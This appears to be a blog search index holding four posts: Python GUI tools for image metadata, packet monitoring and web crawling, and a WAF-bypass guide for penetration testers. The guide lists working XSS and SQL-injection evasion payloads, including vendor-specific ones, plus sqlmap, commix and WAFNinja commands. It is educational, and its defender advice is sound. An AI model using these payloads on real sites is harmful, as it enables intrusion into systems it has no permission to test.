metadata['Image Height'] = img.height        metadata['Bit Depth'] = getattr(img.info, 'bit', 'Not Available')        metadata['Color Type'] = img.mode        metadata['RGB'] = \"Yes\" if img.mode == \"RGB\" else \"No\"        metadata['Compression'] = img.info.get(\"compression\", \"Not Available\")        metadata['Filter'] = img.info.get(\"filter\", \"Not Available\")        metadata['Interlace'] = \"Noninterlaced\" if img.info.get(\"interlace\") == 0 else \"Interlaced\"        metadata['Image Size'] = f\"{img.width}x{img.height}\"        metadata['Megapixels'] = round((img.width * img.height) / 1e6, 2)        metadata['Category'] = \"Image\"        return metadata    def calculate_checksum(self, file_path):        hasher = hashlib.md5()        with open(file_path, 'rb') as f:            buf = f.read()            hasher.update(buf)        return hasher.hexdigest()    def get_gps_coordinates(self, exif_data):        if 'GPS GPSLatitude' in exif_data and 'GPS GPSLongitude' in exif_data:            lat = self.convert_to_degrees(exif_data['GPS GPSLatitude'].values)            lon = self.convert_to_degrees(exif_data['GPS GPSLongitude'].values)            if exif_data['GPS GPSLatitudeRef'].values[0] != 'N':                lat = -lat            if exif_data['GPS GPSLongitudeRef'].values[0] != 'E':                lon = -lon            return lat, lon        return None    def convert_to_degrees(self, value):        d = float(value[0].num) / float(value[0].den)        m = float(value[1].num) / float(value[1].den)        s = float(value[2].num) / float(value[2].den)        return d + (m / 60.0) + (s / 3600.0)    def display_metadata(self):        self.metadata_display.config(state=\"normal\")        self.metadata_display.delete(1.0, tk.END)        for key, value in self.metadata.items():            if key == 'GPS Coordinates' and value:                lat, lon = value                self.metadata_display.insert(tk.END, f\"{key}: https://www.google.com/maps?q={lat},{lon}\\n\")            else:                self.metadata_display.insert(tk.END, f\"{key}: {value}\\n\")        self.metadata_display.config(state=\"disabled\")    def remove_metadata(self):        if not self.image_path:            messagebox.showwarning(\"Warning\", \"Please upload an image first.\")            return        try:            self.progress.start()            image = Image.open(self.image_path)            data = list(image.getdata())            image_without_exif = Image.new(image.mode, image.size)            image_without_exif.putdata(data)            new_image_path = os.path.splitext(self.image_path)[0] + \"_no_metadata\" + os.path.splitext(self.image_path)[1]            image_without_exif.save(new_image_path)            messagebox.showinfo(\"Success\", f\"Metadata removed successfully. New image saved as {new_image_path}\")            self.progress.stop()        except Exception as e:            messagebox.showerror(\"Error\", f\"Failed to remove metadata: {str(e)}\")            self.progress.stop()    def save_metadata(self):        if not self.metadata:            messagebox.showwarning(\"Warning\", \"No metadata available to save.\")            return        file_types = [(\"Text File\", \"*.txt\"), (\"JSON File\", \"*.json\")]        file_path = filedialog.asksaveasfilename(title=\"Save Metadata\", filetypes=file_types, defaultextension=\".txt\")        if file_path:            try:                if file_path.endswith(\".json\"):                    with open(file_path, 'w') as file:                        json.dump(self.metadata, file, indent=4)                else:                    with open(file_path, 'w') as file:                        for key, value in self.metadata.items():                            if key == 'GPS Coordinates' and value:                                lat, lon = value                                file.write(f\"{key}: https://www.google.com/maps?q={lat},{lon}\\n\")                            else:                                file.write(f\"{key}: {value}\\n\")                messagebox.showinfo(\"Success\", f\"Metadata saved as {file_path}\")            except Exception as e:                messagebox.showerror(\"Error\", f\"Failed to save metadata: {str(e)}\")if __name__ == \"__main__\":    root = tk.Tk()    app = MetaDataFinderGUI(root)    root.mainloop()Code StructureThe project is structured as follows:  Class Definition: The entire application is encapsulated within the MetaDataFinderGUI class.  UI Components:          Title Label      Description Label      File Upload Button      Image Preview Frame      Metadata Display Area      Action Buttons (Check Metadata, Remove Metadata, Save Metadata)      Progress Bar        Functional Methods:          upload_image: Handles image selection.      display_image: Displays the selected image in the UI.      check_metadata: Extracts and displays metadata.      remove_metadata: Removes metadata and saves the image.      save_metadata: Saves metadata to a file.        Helper Functions:          format_metadata: Formats metadata for display.      calculate_checksum: Computes the MD5 checksum of the image.      get_gps_coordinates: Extracts GPS coordinates from EXIF data.      convert_to_degrees: Converts GPS values to decimal degrees.      OutputMetadata DisplayWhen you click “Check Metadata,” the following information is displayed:  Date and Time  Camera Model  Device Name  Software  GPS Coordinates (with a clickable Google Maps link)  Checksum  File Name  File Size  File Type  Image Dimensions  Bit Depth  Color Type  Compression  InterlaceExample Saved Metadata FileJSON Format{    \"Date and Time\": \"2023:01:01 12:00:00\",    \"Camera Model\": \"Canon EOS R5\",    \"GPS Coordinates\": [40.7128, -74.0060],    \"Checksum\": \"d41d8cd98f00b204e9800998ecf8427e\",    \"File Name\": \"example.jpg\",    \"File Size\": 123456,    \"File Type\": \"JPEG\"}Text FormatDate and Time: 2023:01:01 12:00:00Camera Model: Canon EOS R5GPS Coordinates: https://www.google.com/maps?q=40.7128,-74.0060Checksum: d41d8cd98f00b204e9800998ecf8427eFile Name: example.jpgFile Size: 123456 bytesFile Type: JPEGLimitations  Supported File Formats: Currently supports only common image formats (JPG, JPEG, PNG, GIF, BMP).  EXIF Data Dependency: Metadata extraction relies on the presence of EXIF data in the image.  No Batch Processing: Limited to processing one image at a time.  Error Handling: Basic error handling; may not cover all edge cases.Future Enhancements  Batch Processing: Add support for processing multiple images simultaneously.  Advanced Metadata Editing: Allow users to edit specific metadata fields.  Cloud Integration: Enable metadata extraction and storage in cloud services.  Cross-Platform Support: Develop a web-based version of the tool.  Improved Error Handling: Enhance robustness by handling more edge cases.Ethical Considerations  Privacy: Metadata often contains sensitive information such as location data. Ensure that users are aware of the implications of extracting and sharing metadata.  Responsible Usage: Encourage users to use this tool responsibly and avoid misuse.  Legal Compliance: Comply with local laws and regulations regarding metadata usage and privacy."
  },
  
  {
    "title": "Network Monitor Tool",
    "url": "/posts/python-network-monitor-tool",
    "categories": "Python, Network Monitor",
    "tags": "Python, Network Monitor",
    "date": "2025-01-19 00:00:00 +0000",
    





    
    "snippet": "The Network Monitor is a tool designed to capture, analyze, and display real-time network traffic. It provides insights into network packets, including source and destination IP addresses, protocol...",
    "content": "The Network Monitor is a tool designed to capture, analyze, and display real-time network traffic. It provides insights into network packets, including source and destination IP addresses, protocols, ports, process names, packet sizes, and geographical locations of remote IPs. Additionally, it includes a real-time bandwidth usage graph to visualize inbound and outbound traffic.Key Features  Packet Capture: Monitors and captures all incoming and outgoing network packets in real-time.  Detailed Packet Analysis: Displays packet details such as:          Timestamp      Source and Destination IP Addresses      Protocol (TCP, UDP, ICMP, DNS, HTTP, FTP, SMTP, SNMP, IMAP)      Port Numbers      Associated Process Names      Packet Size (in bytes)      Geographical Location of Remote IPs        GeoIP Lookup: Uses an external API (e.g., ipstack) to determine the country, city, and ISP of remote IP addresses.  Real-Time Bandwidth Graph: Visualizes inbound and outbound traffic over time using a dynamic graph.  Filtering Capabilities: Allows users to filter packets based on:          IP Address      Port Number      Protocol Type        Auto Scroll Toggle: Enables or disables automatic scrolling in the packet list view.  User-Friendly Interface: Built using Tkinter, providing an intuitive GUI for easy interaction.How It Works  Initialization: The application starts by retrieving the local machine’s IP address and initializing the GUI.  Packet Sniffing: Using the scapy library, the application captures network packets in real-time.  Packet Processing: Each captured packet is analyzed to extract relevant information such as source/destination IPs, protocol, port, process name, and packet size.  GeoIP Lookup: For each remote IP address, a GeoIP lookup is performed to retrieve geographical details.  Display: The extracted information is displayed in a tabular format within the GUI, and the bandwidth graph is updated dynamically.  Filters: Users can apply filters to narrow down the displayed packets based on specific criteria.Full CodeGithub Repository:  Network Monitor Toolimport psutilfrom scapy.layers.inet import IP, TCP, UDP, ICMPfrom scapy.layers.dns import DNSfrom scapy.all import sniff, Rawfrom datetime import datetimeimport threadingimport timeimport platformimport socketimport tkinter as tkfrom tkinter import ttkimport matplotlib.pyplot as pltfrom matplotlib.backends.backend_tkagg import FigureCanvasTkAggimport requests# ANSI Color CodesRESTART = '\\033[0m'  # Reset to defaultB = '\\033[0;30m'  # BlackR = '\\033[0;31m'  # RedG = '\\033[0;32m'  # GreenY = '\\033[0;33m'  # YellowBLU = '\\033[0;34m'  # BlueP = '\\033[0;35m'  # PurpleC = '\\033[0;36m'  # CyanW = '\\033[0;37m'  # White# Temporary LocalHost IP AddressIP_ADDRESS = \"127.0.0.1\"def get_ip_address():    \"\"\"Get the local machine's IP address.\"\"\"    system = platform.system()    if system == \"Windows\":        hostname = socket.gethostname()        ip_address = socket.gethostbyname(hostname)    else:        try:            ip_address = socket.gethostbyname(socket.gethostname())            if ip_address.startswith(\"127.\"):                ip_address = socket.gethostbyname(socket.getfqdn())        except socket.gaierror:            ip_address = \"Unable to get IP address\"    return ip_addressdef get_process_name_by_port(port):    \"\"\"    Get the process name associated with a given port.    Uses psutil.net_connections() to map ports to PIDs.    \"\"\"    try:        for conn in psutil.net_connections(kind='inet'):            if conn.laddr.port == port or (conn.raddr and conn.raddr.port == port):                if conn.pid:                    try:                        return psutil.Process(conn.pid).name()                    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):                        pass        return \"Unknown\"    except Exception as e:        print(f\"Error retrieving process name: {e}\")        return \"Unknown\"class GeoIPLookup:    def __init__(self, api_key=None):        self.api_key = api_key    def lookup(self, ip):        \"\"\"        Perform a GeoIP lookup for the given IP address.        Returns location details or \"Unknown Location\" on failure.        \"\"\"        try:            response = requests.get(f\"http://api.ipstack.com/{ip}\", params={\"access_key\": self.api_key})            if response.status_code == 200:                data = response.json()                country = data.get(\"country_name\", \"Unknown\")                city = data.get(\"city\", \"Unknown\")                isp = data.get(\"connection\", {}).get(\"isp\", \"Unknown\")                return f\"{country}, {city} | ISP: {isp}\"            return \"Unknown Location\"        except Exception as e:            print(f\"Error during GeoIP lookup: {e}\")            return \"Error during lookup\"class NetworkMonitorApp:    def __init__(self, root, api_key=None):        self.root = root        self.root.title(\"Network Monitor\")        self.root.geometry(\"1200x800\")        # Treeview for packet details        self.tree = ttk.Treeview(            root,            columns=(\"Time\", \"Source\", \"Destination\", \"Protocol\", \"Port\", \"Process\", \"Size\", \"Location\"),            show=\"headings\",        )        self.tree.heading(\"Time\", text=\"Timestamp\")        self.tree.heading(\"Source\", text=\"Source IP\")        self.tree.heading(\"Destination\", text=\"Destination IP\")        self.tree.heading(\"Protocol\", text=\"Protocol\")        self.tree.heading(\"Port\", text=\"Port\")        self.tree.heading(\"Process\", text=\"Process\")        self.tree.heading(\"Size\", text=\"Size (Bytes)\")        self.tree.heading(\"Location\", text=\"Location\")        self.tree.pack(fill=tk.BOTH, expand=True)        # Scrollbar for Treeview        self.scrollbar = ttk.Scrollbar(root, orient=tk.VERTICAL, command=self.tree.yview)        self.scrollbar.pack(side=tk.RIGHT, fill=tk.Y)        self.tree.configure(yscrollcommand=self.scrollbar.set)        # Buttons        self.start_button = tk.Button(root, text=\"Start Monitoring\", command=self.start_monitoring)        self.start_button.pack(pady=10)        self.stop_button = tk.Button(root, text=\"Stop Monitoring\", command=self.stop_monitoring, state=tk.DISABLED)        self.stop_button.pack(pady=10)        # Filter Frame        self.filter_frame = tk.Frame(root)        self.filter_frame.pack(pady=10)        tk.Label(self.filter_frame, text=\"Filter by IP:\").grid(row=0, column=0)        self.ip_filter = tk.Entry(self.filter_frame)        self.ip_filter.grid(row=0, column=1)        tk.Label(self.filter_frame, text=\"Filter by Port:\").grid(row=0, column=2)        self.port_filter = tk.Entry(self.filter_frame)        self.port_filter.grid(row=0, column=3)        tk.Label(self.filter_frame, text=\"Filter by Protocol:\").grid(row=0, column=4)        self.protocol_filter = ttk.Combobox(            self.filter_frame, values=[\"TCP\", \"UDP\", \"ICMP\", \"DNS\", \"HTTP\", \"FTP\", \"SMTP\", \"SNMP\", \"IMAP\"]        )        self.protocol_filter.grid(row=0, column=5)        self.apply_filter_button = tk.Button(self.filter_frame, text=\"Apply Filters\", command=self.apply_filters)        self.apply_filter_button.grid(row=0, column=6)        self.reset_filter_button = tk.Button(self.filter_frame, text=\"Reset Filters\", command=self.reset_filters)        self.reset_filter_button.grid(row=0, column=7)        # Auto Scroll Toggle        self.auto_scroll = True        self.toggle_scroll_button = tk.Button(root, text=\"Disable Auto Scroll\", command=self.toggle_auto_scroll)        self.toggle_scroll_button.pack(pady=10)        # Bandwidth Graph        self.figure = plt.Figure(figsize=(6, 4), dpi=100)        self.ax = self.figure.add_subplot(111)        self.canvas = FigureCanvasTkAgg(self.figure, master=root)        self.canvas.get_tk_widget().pack(side=tk.BOTTOM, fill=tk.BOTH, expand=True)        # GeoIP Lookup        self.geoip_lookup = GeoIPLookup(api_key=api_key)        self.running = False        self.total_bytes_in = 0        self.total_bytes_out = 0        self.timestamps = []        self.bandwidth_in = []        self.bandwidth_out = []    def packet_callback(self, packet):        \"\"\"Callback function to process each captured packet.\"\"\"        if not self.running:            return        if packet.haslayer(IP):            ip_layer = packet[IP]            src_ip = ip_layer.src            dst_ip = ip_layer.dst            proto = ip_layer.proto            protocol = \"N/A\"            port = \"N/A\"            size = len(packet)            if proto == 6:  # TCP                protocol = \"TCP\"                if packet.haslayer(TCP):                    port = packet[TCP].sport                    process_name = get_process_name_by_port(packet[TCP].sport)            elif proto == 17:  # UDP                protocol = \"UDP\"                if packet.haslayer(UDP):                    port = packet[UDP].sport                    process_name = get_process_name_by_port(packet[UDP].sport)            elif proto == 1:  # ICMP                protocol = \"ICMP\"                process_name = \"System\"            elif packet.haslayer(DNS):  # DNS                protocol = \"DNS\"                process_name = \"System\"            elif packet.haslayer(Raw) and b\"HTTP\" in bytes(packet[Raw]):  # HTTP                protocol = \"HTTP\"                process_name = \"System\"            elif packet.haslayer(TCP) and packet[TCP].dport == 21:  # FTP                protocol = \"FTP\"                process_name = \"System\"            elif packet.haslayer(TCP) and packet[TCP].dport == 25:  # SMTP                protocol = \"SMTP\"                process_name = \"System\"            elif packet.haslayer(UDP) and packet[UDP].dport == 161:  # SNMP                protocol = \"SNMP\"                process_name = \"System\"            elif packet.haslayer(TCP) and packet[TCP].dport == 143:  # IMAP                protocol = \"IMAP\"                process_name = \"System\"            else:                process_name = \"Unknown\"            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')            location = self.geoip_lookup.lookup(dst_ip)            # Insert into treeview            item_id = self.tree.insert(                \"\", tk.END, values=(timestamp, src_ip, dst_ip, protocol, port, process_name, size, location)            )            if self.auto_scroll:                self.tree.see(item_id)            # Update bandwidth stats            if src_ip == IP_ADDRESS:                self.total_bytes_out += size            else:                self.total_bytes_in += size            self.update_bandwidth_graph()    def start_monitoring(self):        \"\"\"Start capturing network packets.\"\"\"        self.running = True        self.start_button.config(state=tk.DISABLED)        self.stop_button.config(state=tk.NORMAL)        self.sniff_thread = threading.Thread(target=self.start_sniffing)        self.sniff_thread.daemon = True        self.sniff_thread.start()    def stop_monitoring(self):        \"\"\"Stop capturing network packets.\"\"\"        self.running = False        self.start_button.config(state=tk.NORMAL)        self.stop_button.config(state=tk.DISABLED)    def start_sniffing(self):        \"\"\"Start the packet sniffing process.\"\"\"        sniff(prn=self.packet_callback, filter=\"ip\", store=0)    def update_bandwidth_graph(self):        \"\"\"Update the real-time bandwidth graph.\"\"\"        self.timestamps.append(time.time())        self.bandwidth_in.append(self.total_bytes_in)        self.bandwidth_out.append(self.total_bytes_out)        if len(self.timestamps) &gt; 10:  # Limit data points to 10            self.timestamps.pop(0)            self.bandwidth_in.pop(0)            self.bandwidth_out.pop(0)        self.ax.clear()        self.ax.plot(self.timestamps, self.bandwidth_in, label=\"Inbound\", color=\"blue\")        self.ax.plot(self.timestamps, self.bandwidth_out, label=\"Outbound\", color=\"red\")        self.ax.set_title(\"Real-Time Bandwidth Usage\")        self.ax.set_xlabel(\"Time\")        self.ax.set_ylabel(\"Bytes\")        self.ax.legend()        self.canvas.draw()    def apply_filters(self):        \"\"\"Apply filters based on user input.\"\"\"        ip_filter = self.ip_filter.get().strip()        port_filter = self.port_filter.get().strip()        protocol_filter = self.protocol_filter.get().strip()        for child in self.tree.get_children():            values = self.tree.item(child, \"values\")            src_ip, dst_ip, protocol, port = values[1], values[2], values[3], values[4]            if (                (not ip_filter or ip_filter in src_ip or ip_filter in dst_ip)                and (not port_filter or port_filter == port)                and (not protocol_filter or protocol_filter == protocol)            ):                self.tree.reattach(child, \"\", 0)            else:                self.tree.detach(child)    def reset_filters(self):        \"\"\"Reset all filters and restore the default view.\"\"\"        for child in self.tree.get_children():            self.tree.reattach(child, \"\", 0)    def toggle_auto_scroll(self):        \"\"\"Toggle auto-scroll functionality.\"\"\"        self.auto_scroll = not self.auto_scroll        if self.auto_scroll:            self.toggle_scroll_button.config(text=\"Disable Auto Scroll\")        else:            self.toggle_scroll_button.config(text=\"Enable Auto Scroll\")if __name__ == \"__main__\":    IP_ADDRESS = get_ip_address()    GEOIP_API_KEY = \"\"  # Replace with your actual API key    root = tk.Tk()    app = NetworkMonitorApp(root, api_key=GEOIP_API_KEY)    root.mainloop()Future ImplementationsWhile the current version of the Network Monitor Application provides robust functionality, there are several potential enhancements and features that could be added in future iterations:  Advanced Filtering:          Allow filtering by MAC addresses.      Add support for filtering by packet payload content (e.g., keywords in HTTP requests).        Export Functionality:          Enable exporting packet logs to CSV, JSON, or other formats for further analysis.        Enhanced GeoIP Lookup:          Integrate more advanced GeoIP services for better accuracy and additional details (e.g., latitude/longitude).      Cache frequently accessed GeoIP lookups to reduce API calls and improve performance.        Dark Mode Support:          Add a dark mode theme for improved readability and aesthetics.        Alert System:          Implement alerts for suspicious activities, such as unexpected outbound connections or large data transfers.        Multi-Interface Support:          Allow monitoring of multiple network interfaces simultaneously.        Performance Optimization:          Optimize packet processing and UI updates for smoother performance on high-traffic networks.        Packet Reconstruction:          Add the ability to reconstruct and display full HTTP requests/responses or other protocol-specific data.        User Authentication:          Introduce user authentication and role-based access control for secure usage in enterprise environments.        Cross-Platform Packaging:          Package the application as a standalone executable for Windows, macOS, and Linux using tools like PyInstaller.      These enhancements would make the application even more versatile and valuable for both personal and professional use cases.Output"
  },
  
  {
    "title": "WAF Bypass: Techniques, Tools, and Tactics for Penetration Testers",
    "url": "/posts/waf-bypass",
    "categories": "Exploits, WAF Bypass",
    "tags": "Exploits, WAF Bypass, Web Application Security",
    "date": "2025-01-17 00:00:00 +0000",
    





    
    "snippet": "Bypassing Web Application Firewalls (WAFs): Techniques, Tools, and Tactics for Penetration TestersTable of Contents  What is a Web Application Firewall (WAF)?  Purpose of a WAF  How Does a WAF Work...",
    "content": "Bypassing Web Application Firewalls (WAFs): Techniques, Tools, and Tactics for Penetration TestersTable of Contents  What is a Web Application Firewall (WAF)?  Purpose of a WAF  How Does a WAF Work?  Famous WAF Services  The Importance of a WAF in Vulnerability Protection  Top 10 Ways to Bypass a WAF  Advanced WAF Bypass Techniques  Tools to Bypass WAFs  XSS Bypass Techniques and Payloads  Real-World Examples of WAF Bypasses  Best Practices for Defenders  ConclusionWhat is a Web Application Firewall (WAF)?A Web Application Firewall (WAF) is a security mechanism that monitors, filters, and blocks HTTP/HTTPS traffic to and from a web application. Its primary purpose is to protect web applications from common cyber threats like cross-site scripting (XSS), SQL injection (SQLi), file inclusion attacks, and other types of malicious payloads. WAFs analyze the data that flows between the internet and a web application, looking for patterns of attack and preventing potentially harmful traffic from reaching the application.Purpose of a WAFThe role of a WAF in a security strategy is critical because web applications are increasingly targeted by hackers. As more organizations move services online, they become prime targets for attackers looking to steal data, disrupt services, or gain unauthorized access to sensitive systems.A WAF provides several key functions:  Traffic Filtering: Inspects incoming HTTP requests and blocks malicious traffic based on predefined rules.  Attack Prevention: Actively mitigates the risk of common web vulnerabilities, including XSS, SQL injection, remote file inclusion (RFI), and others.  Access Control: Restricts access to certain parts of a web application, ensuring only authorized users can access sensitive data.  DDoS Mitigation: Some WAFs provide built-in protection against distributed denial of service (DDoS) attacks.How Does a WAF Work?WAFs typically operate at the application layer (Layer 7) of the OSI model, monitoring HTTP/HTTPS requests. They are placed in front of a web application to inspect traffic before it reaches the application server. WAFs rely on various detection mechanisms, including:  Signature-based Detection: Compares traffic against known attack patterns.  Behavioral Analysis: Identifies abnormal behavior that deviates from the norm.  Rule-based Detection: Administrators can define custom rules for specific attack patterns.Famous WAF ServicesSeveral companies offer Web Application Firewall services, some of the most notable include:  AWS Web Application Firewall (AWS WAF)  Cloudflare WAF  Imperva WAF  F5 Advanced WAF  Azure Web Application FirewallThe Importance of a WAF in Vulnerability ProtectionA properly configured WAF plays a vital role in securing applications. However, it’s important to understand that WAFs are not foolproof. Despite their ability to block many common attacks, they can often be bypassed by skilled attackers. For cybersecurity professionals, particularly penetration testers and red teams, understanding how WAFs function and the weaknesses in their detection systems is key to finding vulnerabilities.Top 10 Ways to Bypass a WAF  Payload Encoding and Obfuscation          Techniques: Hex encoding, Base64 encoding, URL encoding.      Example: %53%45%4C%45%43%54%20%2A%20%46%52%4F%4D%20%75%73%65%72%73%20%57%48%45%52%45%20%69%64%20%3D%201;        HTTP Parameter Pollution          Example: GET /login?username=admin&amp;password=admin123&amp;password=malicious_payload        Case Transformation          Example: SeLeCt * FrOm users WhErE username = 'admin';        IP Fragmentation          Example: Splitting payloads into multiple IP packets.        JSON and XML Payloads          Example: Injecting malicious code into JSON/XML formats.        Session Awareness Bypassing          Example: Spreading attacks across multiple requests.        404 Bypassing          Example: Targeting non-existent pages to reduce WAF scrutiny.        DNS-Based Attacks          Example: Sending requests directly to the server’s IP address.        Rate Limiting Bypass          Example: Distributing requests across a botnet.        Exploiting Zero-Day Vulnerabilities          Example: Using unpatched flaws in software.      Advanced WAF Bypass Techniques1. Polyglot Payloads  Polyglot payloads are designed to work in multiple contexts (e.g., HTML, JavaScript, SQL).  Example: &lt;script&gt;/*&lt;/script&gt;&lt;svg onload=alert(1)&gt;*/2. Time-Based Attacks  Exploiting time delays in WAF processing to bypass detection.  Example: Using SLEEP() in SQL injection payloads.3. Content-Type Manipulation  Changing the Content-Type header to confuse the WAF.  Example: Sending a JSON payload with Content-Type: text/plain.4. Chunked Encoding  Splitting payloads into chunks to evade detection.  Example: Using Transfer-Encoding: chunked in HTTP requests.Tools to Bypass WAFsHere are some popular tools used to bypass WAFs:  SQLMap          Features: Payload encoding, tamper scripts.      Command: python sqlmap.py -u \"&lt;http://target.com/page.php?id=1&gt;\" --tamper=between,randomcase        WAFNinja          Features: Payload obfuscation, fragmentation.      Command: python wafninja.py -u \"&lt;http://target.com/page&gt;\" --method get --payloads sql_injection.txt        Nmap with NSE Scripts          Features: HTTP fragmentation, custom user-agent injection.      Command: nmap --script http-waf-detect target.com        Burp Suite with Extensions          Features: Payload encoding, fuzzing.      Example: Use the Bypass WAF extension.        Commix          Features: Command injection payloads.      Command: python commix.py --url=\"&lt;http://target.com/page.php?id=1&gt;\" --waf-bypass        OWASP ZAP          Features: Fuzzing, scripting.      Example: Use custom scripts to test WAF evasion.      XSS Bypass Techniques and PayloadsCommon Techniques  Obfuscation          Example: &lt;img src=x onerror=\"/*&lt;![CDATA[*/alert(1)/*]]&gt;*/\"&gt;        Alternate Event Handlers          Example: &lt;div style=\"width:expression(alert(1))\"&gt;&lt;/div&gt;        Polyglot Payloads          Example: &lt;script&gt;/*&lt;/script&gt;&lt;svg onload=alert(1)&gt;*/        Payload Splitting          Example: &lt;img src='1' onerror='ja'+'vascript:alert(1)'&gt;        Manipulating Headers          Example: Injecting malicious content into HTTP headers.      WAF-Specific Payloads  Akamai: &lt;style&gt;@keyframes a{}b{animation:a;}&lt;/style&gt;&lt;b/onanimationstart=prompt ${document.domain}&amp;#x60;&gt;  Cloudflare: &lt;a\"/onclick=(confirm)()&gt;Click Here!  Imperva: &lt;x/onclick=globalThis&amp;lsqb;'\\u0070r\\u006f'+'mpt']&amp;lt;)&gt;clickme  Incapsula: &lt;iframe/onload='this[\"src\"]=\"javas&amp;Tab;cript:al\"+\"ert\"';&gt;  WordFence: &lt;meter onmouseover=\"alert(1)\"Real-World Examples of WAF Bypasses  Cloudflare WAF Bypass          Attackers used chunked encoding to bypass Cloudflare’s detection mechanisms.      Example: Splitting payloads into multiple chunks to evade signature-based detection.        AWS WAF Bypass          Exploiting misconfigurations in AWS WAF rules to inject malicious payloads.      Example: Using JSON payloads with malformed syntax to bypass detection.        Imperva WAF Bypass          Attackers used polyglot payloads to exploit Imperva’s rule-based detection.      Example: Combining HTML, JavaScript, and SQL in a single payload.      Best Practices for Defenders  Regular Updates: Keep WAF signatures and rules up-to-date.  Defense-in-Depth: Use multiple layers of security (e.g., input validation, CSP).  Security Testing: Perform regular penetration testing and security assessments.  Behavioral Analysis: Implement machine learning-based behavioral analysis to detect anomalies.  Logging and Monitoring: Continuously monitor WAF logs for suspicious activity.ConclusionWhile WAFs are powerful tools for defending web applications, they are not invulnerable. Attackers constantly develop new methods to bypass these defenses, and the techniques and tools discussed above are instrumental in identifying vulnerabilities that may be missed by a WAF. For security professionals, it’s essential to stay informed about the latest bypass techniques and ensure WAF configurations are up to date."
  },
  
  {
    "title": "Web Scraper and Crawling Tool",
    "url": "/posts/python-web-scraper",
    "categories": "Python, Web Scraper",
    "tags": "Python, Web Scraper",
    "date": "2025-01-12 00:00:00 +0000",
    





    
    "snippet": "A Python-based web scraping and crawling tool with a graphical user interface (GUI) built using tkinter. This tool allows users to crawl websites, download pages, and save them locally while mainta...",
    "content": "A Python-based web scraping and crawling tool with a graphical user interface (GUI) built using tkinter. This tool allows users to crawl websites, download pages, and save them locally while maintaining the directory structure. It’s designed for ease of use, with features like depth control, rate limiting, and real-time logging.Features  Intuitive GUI: Built with tkinter for a user-friendly experience.  Depth Control: Set the maximum depth for crawling to control how far the crawler goes.  Local Saving: Downloads and saves web pages locally, rewriting links for offline use.  Rate Limiting: Configurable delay between requests to avoid overwhelming servers.  Stop Functionality: Stop the crawling process at any time with a single click.  Real-Time Logging: Monitor the crawling process with live updates in the GUI.How It WorksCrawling AlgorithmThe crawler uses a breadth-first search (BFS) algorithm with depth control:  Starts with the base URL at depth 0.  Processes pages in FIFO order.  Discovers new links up to the specified maximum depth.  Maintains a set of visited URLs to avoid duplicates.URL ValidationThe tool includes special handling for Wikipedia and other sites:def is_valid_url(self, url):    # Skip images and non-HTML files    # Special rules for Wikipedia URLs    # Standard validation for other domainsLink RewritingLocalizes links using relative paths for offline use:local_path = self.clean_filename(absolute_url)relative_path = os.path.relpath(local_path, os.path.dirname(filename))anchor['href'] = relative_pathThreading for Responsive GUIThe crawling process runs in a separate thread to keep the GUI responsive:threading.Thread(target=crawl_thread, daemon=True).start()Full CodeGithub Repository:  Web Scraper Toolimport tkinter as tkfrom tkinter import ttk, filedialog, messageboximport threadingimport sysimport osimport requestsfrom bs4 import BeautifulSoupfrom urllib.parse import urljoin, urlparseimport timeimport reclass WebsiteCrawler:    def __init__(self, base_url, output_dir=\"downloaded_site\", max_depth=3):        self.base_url = base_url        self.domain = urlparse(base_url).netloc        self.output_dir = output_dir        self.visited_urls = set()        self.rate_limit = 1  # Delay between requests in seconds        self.max_depth = max_depth        self.stop_requested = False  # Flag to control crawling        # Create output directory if it doesn't exist        if not os.path.exists(output_dir):            os.makedirs(output_dir)    def stop(self):        \"\"\"Request the crawler to stop after current page\"\"\"        self.stop_requested = True        print(\"\\nStop requested. Finishing current page...\")    def is_valid_url(self, url):        \"\"\"Check if URL belongs to the same domain and is a webpage.\"\"\"        try:            parsed = urlparse(url)            # Skip any image files            image_extensions = ('.jpg', '.jpeg', '.png', '.gif', '.svg', '.webp', '.bmp', '.ico')            if url.lower().endswith(image_extensions):                print(f\"Skipping image file: {url}\")                return False            # Skip Wikipedia special pages and non-article pages            skip_patterns = [                '/wiki/Wikipedia:',                '/wiki/File:',                '/wiki/Help:',                '/wiki/Special:',                '/wiki/Talk:',                '/wiki/User:',                '/wiki/Template:',                '/wiki/Category:',                '/wiki/Portal:',                'action=',                'oldid=',                'diff=',                'printable=',                'mobileaction='            ]            # Check if this is a Wikipedia URL and if so, apply special rules            if 'wikipedia.org' in parsed.netloc:                # Skip special pages but allow all regular article pages                if any(pattern in url for pattern in skip_patterns):                    print(f\"Skipping Wikipedia special page: {url}\")                    return False                # Make sure it's a wiki article page                if not '/wiki/' in url:                    print(f\"Skipping non-article page: {url}\")                    return False                # Allow all regular Wikipedia articles                if '/wiki/' in url and parsed.netloc == self.domain:                    return True            # For non-Wikipedia sites, use standard validation            is_valid = (                    parsed.netloc == self.domain and                    parsed.scheme in ['http', 'https'] and                    not url.endswith(('.pdf', '.zip', '.doc', '.docx'))            )            if not is_valid:                print(f\"URL rejected: {url}\")            return is_valid        except Exception as e:            print(f\"Error parsing URL {url}: {str(e)}\")            return False    def clean_filename(self, url):        \"\"\"Convert URL to a valid filename.\"\"\"        # Remove the domain and scheme        filename = urlparse(url).path        if not filename or filename.endswith('/'):            filename += 'index.html'        elif not filename.endswith('.html'):            filename += '.html'        # Clean the filename        filename = re.sub(r'[&lt;&gt;:\"/\\\\|?*]', '_', filename)        return filename.lstrip('/')    def download_page(self, url):        \"\"\"Download a webpage and return its content.\"\"\"        try:            headers = {                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'            }            print(f\"\\nAttempting to download: {url}\")            response = requests.get(url, timeout=10, headers=headers)            response.raise_for_status()            print(f\"Download successful! Status code: {response.status_code}\")            print(f\"Content length: {len(response.text)} characters\")            return response.text        except requests.exceptions.RequestException as e:            print(f\"Error downloading {url}: {str(e)}\")            return None    def save_page(self, content, url):        \"\"\"Save webpage content to a file and rewrite links to point to local files.\"\"\"        if content:            filename = self.clean_filename(url)            filepath = os.path.join(self.output_dir, filename)            print(f\"\\nSaving page to: {filepath}\")            try:                # Parse the HTML                soup = BeautifulSoup(content, 'html.parser')                # Remove all image elements                for img in soup.find_all('img'):                    img.decompose()                # Remove all picture elements                for picture in soup.find_all('picture'):                    picture.decompose()                # Remove image-related elements like figure/figcaption if they're empty after image removal                for figure in soup.find_all('figure'):                    if not figure.find(string=True, recursive=False):                        